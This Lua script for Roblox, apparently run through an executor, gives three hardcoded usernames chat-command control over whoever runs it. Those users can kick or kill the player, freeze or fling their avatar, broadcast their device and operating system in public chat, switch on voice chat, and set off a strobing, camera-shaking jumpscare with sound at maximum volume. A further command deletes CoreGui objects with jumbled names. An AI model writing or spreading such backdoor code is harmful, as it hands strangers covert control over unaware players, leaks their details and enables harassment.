if not game:IsLoaded() then game.Loaded:Wait() end

function default(expected, value, fallback)
    if type(value) == expected then
        return value
    end
    return fallback
end

Services = setmetatable({}, {
    __index = function(self, name)
        local success, cache = pcall(function()
            return game:GetService(name)
        end)
        if success then
            rawset(self, name, cache)
            return cache
        else
            error("Invalid Service: " .. tostring(name))
        end
    end
})

local Players = Services.Players
local TeleportService = Services.TeleportService
local CoreGui = Services.CoreGui
local TextChatService = Services.TextChatService
local RunService = Services.RunService
local UserInputService = Services.UserInputService
local GuiService = Services.GuiService
local SoundService = Services.SoundService
local Lighting = Services.Lighting
local VoiceChatService = Services.VoiceChatService

local Admins = {
    "IlIIllIlIIlIllIIlllI",
    "hamza_pro231",
    "C4N0Fz",
}

local Player = Players.LocalPlayer

local Cmd = { commands = {} }
local Conn = { connections = {} }
local Var = { variables = {} }

function Conn.New(name, event, callback)
    local ok, connection = pcall(function() return event:Connect(callback) end)
    if ok then Conn.connections[name] = connection return connection end
end

function Conn.Remove(name)
    if Conn.connections[name] then
        pcall(Conn.connections[name].Disconnect, Conn.connections[name])
        Conn.connections[name] = nil
    end
end

function Var.New(name, value)
    Var.variables[name] = value
    return value
end

function Var.Get(name) return Var.variables[name] end
function Var.Set(name, value) Var.variables[name] = value end

Var.New("OriginalWalkSpeed", 16)
Var.New("OriginalJumpPower", 50)
Var.New("IsOrbiting", false)
Var.New("IsSpinning", false)
Var.New("CurrentSpinSpeed", 0)
Var.New("OrbitConnection", nil)
Var.New("SpinConnection", nil)
Var.New("JumpscareActive", false)
Var.New("JumpscareEffects", {})
Var.New("JumpscareLoops", true)

function Cmd.New(name, func) Cmd.commands[name] = func end

local function GetDevice()
    local touch = UserInputService.TouchEnabled
    local keyboard = UserInputService.KeyboardEnabled
    local mouse = UserInputService.MouseEnabled
    if touch and not keyboard and not mouse then return "Mobile"
    elseif not touch and keyboard and mouse then return "PC"
    else return "Unknown" end
end

local function GetOs()
    local platform = UserInputService:GetPlatform()
    local map = {
        [Enum.Platform.Windows] = "Windows",
        [Enum.Platform.OSX] = "macOS",
        [Enum.Platform.IOS] = "iOS",
        [Enum.Platform.Android] = "Android",
    }
    return map[platform] or "Unknown"
end

local function SendChat(message)
    pcall(function()
        if TextChatService.TextChannels then
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        end
    end)
end

local function FindPlayer(input)
    input = input:lower()
    local matches = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr == Player then continue end
        if plr.Name:lower() == input or plr.DisplayName:lower() == input then
            return plr
        end
        if plr.Name:lower():find(input, 1, true) or plr.DisplayName:lower():find(input, 1, true) then
            table.insert(matches, plr)
        end
    end
    if #matches == 1 then return matches[1] end
    return nil
end

Cmd.New("getdevice", function(args, admin, target)
    local targetPlayer = target or Player
    SendChat(targetPlayer.Name .. " Device: " .. GetDevice())
end)

Cmd.New("getos", function(args, admin, target)
    local targetPlayer = target or Player
    SendChat(targetPlayer.Name .. " OS: " .. GetOs())
end)

Cmd.New("freeze", function(args, admin, target)
    local targetPlayer = target or Player
    local humanoid = targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        Var.Set("OriginalWalkSpeed", humanoid.WalkSpeed)
        Var.Set("OriginalJumpPower", humanoid.JumpPower)
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
    end
    if targetPlayer.Character then
        for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
            if part:IsA("BasePart") then part.Anchored = true end
        end
    end
end)

Cmd.New("unfreeze", function(args, admin, target)
    local targetPlayer = target or Player
    local humanoid = targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = Var.Get("OriginalWalkSpeed")
        humanoid.JumpPower = Var.Get("OriginalJumpPower")
    end
    if targetPlayer.Character then
        for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
            if part:IsA("BasePart") then part.Anchored = false end
        end
    end
end)

Cmd.New("walkspeed", function(args, admin, target)
    local speed = tonumber(args[1])
    if speed then
        local targetPlayer = target or Player
        local humanoid = targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.WalkSpeed = speed end
    end
end)

Cmd.New("jumppower", function(args, admin, target)
    local power = tonumber(args[1])
    if power then
        local targetPlayer = target or Player
        local humanoid = targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.JumpPower = power end
    end
end)

Cmd.New("fling", function(args, admin, target)
    local targetPlayer = target or Player
    local humanoid = targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    local root = targetPlayer.Character and (targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head"))
    if root then
        local direction = Vector3.new(math.random(-100, 100), math.random(150, 600), math.random(-100, 100))
        root.Velocity = direction
        if humanoid then humanoid.Sit = true end
    end
end)

Cmd.New("kill", function(args, admin, target)
    local targetPlayer = target or Player
    local humanoid = targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then humanoid.Health = 0 end
end)

Cmd.New("sit", function(args, admin, target)
    local targetPlayer = target or Player
    local humanoid = targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then humanoid.Sit = true end
end)

Cmd.New("orbit", function(args, admin, target)
    local targetPlayer = target or Player
    local adminRoot = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not adminRoot or not targetRoot then return end
    if Var.Get("IsOrbiting") then
        Var.Set("IsOrbiting", false)
        if Var.Get("OrbitConnection") then
            Var.Get("OrbitConnection"):Disconnect()
            Var.Set("OrbitConnection", nil)
        end
    end
    Var.Set("IsOrbiting", true)
    local angle, radius, speed = 0, 5, 2
    local orbitConnection = RunService.RenderStepped:Connect(function()
        if not Var.Get("IsOrbiting") or not adminRoot or not adminRoot.Parent or not targetRoot then
            if Var.Get("OrbitConnection") then
                Var.Get("OrbitConnection"):Disconnect()
                Var.Set("OrbitConnection", nil)
            end
            Var.Set("IsOrbiting", false)
            return
        end
        angle = angle + speed * RunService.RenderStepped:Wait()
        local offset = CFrame.new(adminRoot.Position) * CFrame.Angles(0, angle, 0) * CFrame.new(radius, 0, 0)
        targetRoot.CFrame = offset
    end)
    Var.Set("OrbitConnection", orbitConnection)
end)

Cmd.New("unorbit", function()
    Var.Set("IsOrbiting", false)
    if Var.Get("OrbitConnection") then
        Var.Get("OrbitConnection"):Disconnect()
        Var.Set("OrbitConnection", nil)
    end
end)

Cmd.New("spin", function(args, admin, target)
    local speedNum = tonumber(args[1]) or 5
    local targetPlayer = target or Player
    local hrp = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    if Var.Get("IsSpinning") then
        Var.Set("IsSpinning", false)
        if Var.Get("SpinConnection") then
            Var.Get("SpinConnection"):Disconnect()
            Var.Set("SpinConnection", nil)
        end
    end
    Var.Set("IsSpinning", true)
    Var.Set("CurrentSpinSpeed", speedNum)
    local spinConnection = RunService.RenderStepped:Connect(function()
        if not Var.Get("IsSpinning") or not hrp then
            if Var.Get("SpinConnection") then
                Var.Get("SpinConnection"):Disconnect()
                Var.Set("SpinConnection", nil)
            end
            Var.Set("IsSpinning", false)
            return
        end
        local dt = RunService.RenderStepped:Wait()
        local rotation = CFrame.Angles(0, math.rad(Var.Get("CurrentSpinSpeed") * dt), 0)
        hrp.CFrame = hrp.CFrame * rotation
    end)
    Var.Set("SpinConnection", spinConnection)
end)

Cmd.New("unspin", function()
    Var.Set("IsSpinning", false)
    if Var.Get("SpinConnection") then
        Var.Get("SpinConnection"):Disconnect()
        Var.Set("SpinConnection", nil)
    end
end)

Cmd.New("kick", function(args, admin, target)
    local targetPlayer = target or Player
    local reason = #args > 1 and table.concat(args, " ", 2) or "Kicked by admin"
    targetPlayer:Kick(reason)
end)

Cmd.New("bring", function(args, admin, target)
    local targetPlayer = target or Player
    local adminRoot = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = targetPlayer.Character and (targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head"))
    if adminRoot and targetRoot then
        targetRoot.CFrame = adminRoot.CFrame + Vector3.new(0, 3, 0)
    end
end)

Cmd.New("chat", function(args)
    local msg = table.concat(args, " ")
    SendChat(msg)
end)

Cmd.New("fps", function(args)
    local fps = tonumber(args[1])
    if fps then
        pcall(function() settings().Rendering.MaxFrameRate = math.clamp(fps, 1, 1000) end)
    end
end)

Cmd.New("vc", function(args, admin, target)
    local targetPlayer = target or Player
    if targetPlayer == Player then
        pcall(function() VoiceChatService:SetVoiceEnabled(true) end)
    end
end)

Cmd.New("unvc", function(args, admin, target)
    local targetPlayer = target or Player
    if targetPlayer == Player then
        pcall(function() VoiceChatService:SetVoiceEnabled(false) end)
    end
end)

Cmd.New("jumpscare", function()
    if Var.Get("JumpscareActive") then return end
    Var.Set("JumpscareActive", true)
    Var.Set("JumpscareLoops", true)
    local effects = {}
    local colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(255, 0, 0)
    colorCorrection.Contrast = 2
    colorCorrection.Saturation = 1
    colorCorrection.Parent = Lighting
    table.insert(effects, colorCorrection)
    local blur = Instance.new("BlurEffect")
    blur.Size = 0
    blur.Parent = Lighting
    table.insert(effects, blur)
    local bloom = Instance.new("BloomEffect")
    bloom.Intensity = 2
    bloom.Size = 40
    bloom.Threshold = 0.8
    bloom.Parent = Lighting
    table.insert(effects, bloom)
    local sunRays = Instance.new("SunRaysEffect")
    sunRays.Intensity = 0.5
    sunRays.Spread = 0.5
    sunRays.Parent = Lighting
    table.insert(effects, sunRays)
    Var.Set("JumpscareEffects", effects)
    task.spawn(function()
        local toggle = true
        while Var.Get("JumpscareActive") do
            if toggle then
                colorCorrection.TintColor = Color3.fromRGB(255, 0, 0)
                blur.Size = 20
            else
                colorCorrection.TintColor = Color3.fromRGB(0, 0, 0)
                blur.Size = 0
            end
            toggle = not toggle
            task.wait(0.08)
        end
    end)
    task.spawn(function()
        while Var.Get("JumpscareActive") do
            local camera = workspace.CurrentCamera
            if camera then
                local offset = Vector3.new(math.random(-30, 30) / 10, math.random(-30, 30) / 10, math.random(-20, 20) / 10)
                local rotOffset = CFrame.Angles(math.rad(math.random(-20, 20)), math.rad(math.random(-20, 20)), math.rad(math.random(-20, 20)))
                camera.CFrame = camera.CFrame * rotOffset + offset
            end
            task.wait(0.03)
        end
    end)
    for i = 1, 10 do
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://4899159505"
        sound.Volume = 10
        sound.PlaybackSpeed = 0.8
        sound.Parent = SoundService
        sound:Play()
        task.wait(0.05)
    end
    task.spawn(function()
        while Var.Get("JumpscareActive") and Var.Get("JumpscareLoops") do
            local loopedSound = Instance.new("Sound")
            loopedSound.SoundId = "rbxassetid://4899159505"
            loopedSound.Volume = 10
            loopedSound.PlaybackSpeed = 0.8
            loopedSound.Parent = SoundService
            loopedSound:Play()
            loopedSound.Ended:Wait()
            loopedSound:Destroy()
        end
    end)
end)

Cmd.New("unjumpscare", function()
    Var.Set("JumpscareActive", false)
    Var.Set("JumpscareLoops", false)
    local effects = Var.Get("JumpscareEffects")
    for _, v in ipairs(effects) do
        if typeof(v) == "Instance" then v:Destroy() end
    end
    Var.Set("JumpscareEffects", {})
    local camera = workspace.CurrentCamera
    if camera then camera.CameraType = Enum.CameraType.Custom end
end)

Cmd.New("delexec", function()
    pcall(function()
        local Whitelisted = {
            ["RobloxGui"] = true, ["PlayerList"] = true, ["ExperienceChat"] = true,
            ["BubbleChat"] = true, ["DevConsole"] = true, ["SocialService"] = true,
            ["PerformanceStats"] = true, ["ScreenShotTool"] = true, ["EmotesMenu"] = true,
            ["CallDialogScreen"] = true, ["CaptureManager"] = true, ["CaptureOverlay"] = true,
            ["Composer"] = true, ["ContactList"] = true, ["Chat"] = true,
            ["HeadsetDisconnectedDialog"] = true, ["InExperienceInterventionApp"] = true,
            ["PlayerMenuScreen"] = true, ["PurchasePromptApp"] = true, ["RobloxPromptGui"] = true,
            ["ScreenshotsCarousel"] = true, ["TeleportEffectGui"] = true, ["TopBarApp"] = true,
            ["ControlGui"] = true, ["VehicleGui"] = true, ["NotificationGui"] = true,
            ["DescendantProtector"] = true, ["AppUpdaterGui"] = true, ["FaceTrackingGui"] = true,
            ["ExperienceNotificationGui"] = true, ["VoiceChatGui"] = true, ["SafetyCheckGui"] = true,
            ["ToastGui"] = true, ["InGameMenuV2"] = true, ["RightClickMenu"] = true,
            ["VoiceChatPromptGui"] = true, ["BottomBarGui"] = true, ["GuiService"] = true,
            ["FullscreenTitleBar"] = true, ["TextureView"] = true, ["ChromeGui"] = true,
            ["BlockingApp"] = true, ["HealthGui"] = true, ["StutterDetector"] = true,
            ["AvatarContextMenuItem"] = true
        }
        local function GetTop(p)
            local current = p
            while current.Parent and current.Parent ~= CoreGui and current.Parent ~= game do
                current = current.Parent
            end
            return current
        end
        local function IsJumble(name)
            if string.match(name, "[^%w%s%-%.]") then return true end
            if #name > 30 then return true end
            local upper = #string.gsub(name, "[^A-Z]", "")
            local lower = #string.gsub(name, "[^a-z]", "")
            local total = upper + lower
            if total > 5 then
                if string.match(name, "%u%u%u") then return true end
                local _, vowel = string.gsub(name:lower(), "[aeiouy]", "")
                if vowel == 0 or (vowel / total) < 0.15 then return true end
                if upper > 1 and lower > 1 and string.match(name, "%l%u%l") then return true end
            end
            return false
        end
        for _, obj in ipairs(CoreGui:GetDescendants()) do
            local top = GetTop(obj)
            if top and Whitelisted[top.Name] then continue end
            if IsJumble(obj.Name) then
                pcall(function() obj:Destroy() end)
            end
        end
    end)
end)

local function LoadCmds(admin, msg)
    local parts = {}
    for part in string.gmatch(msg, "%S+") do
        table.insert(parts, part)
    end
    if #parts == 0 then return end

    local cmdName = string.lower(parts[1])
    local args = { table.unpack(parts, 2) }

    local target = nil
    local cmdArgs = args

    if #args > 0 then
        local potential = FindPlayer(args[1])
        if potential then
            target = potential
            cmdArgs = { table.unpack(args, 2) }
        end
    end

    local command = Cmd.commands[cmdName]
    if command then
        local success, err = pcall(command, cmdArgs, admin, target)
        if not success then
            warn("[!" .. cmdName .. " error]: " .. tostring(err))
        end
    end
end

local function OnChatted(plr, msg)
    if plr == Player then return end
    if not table.find(Admins, plr.Name) then return end

    local cmdMsg = nil
    if string.sub(msg, 1, 1) == "!" then
        cmdMsg = string.sub(msg, 2)
    elseif string.sub(msg, 1, 3) == "/e " then
        cmdMsg = string.sub(msg, 4)
    else
        return
    end

    LoadCmds(plr, cmdMsg)
end

for _, plr in ipairs(Players:GetPlayers()) do
    Conn.New(plr.Name .. "_chatted", plr.Chatted, function(msg) OnChatted(plr, msg) end)
end

Conn.New("player_added", Players.PlayerAdded, function(plr)
    Conn.New(plr.Name .. "_chatted", plr.Chatted, function(msg) OnChatted(plr, msg) end)
end)
